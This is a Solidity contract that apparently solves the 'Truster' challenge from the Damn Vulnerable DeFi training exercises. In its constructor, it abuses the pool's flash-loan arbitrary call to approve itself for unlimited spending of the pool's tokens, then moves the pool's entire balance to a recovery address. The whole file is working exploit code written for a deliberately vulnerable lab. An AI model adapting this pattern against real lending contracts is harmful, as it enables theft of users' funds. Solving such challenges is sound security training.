// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "./TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract ExploitTruster {
    TrusterLenderPool pool;
    DamnValuableToken token;
    address recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;

        // Crafting the data to approve our contract to spend the pool's tokens
        bytes memory data = abi.encodeCall(
            token.approve,
            (address(this),
            type(uint256).max)
        );

        // Taking out a flash loan of 0 tokens to execute the approve call (target is the token contract)
        pool.flashLoan(
            0,
            address(this),
            address(token),
            data
        );

        // Now we can transfer the tokens from the pool to our address
        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}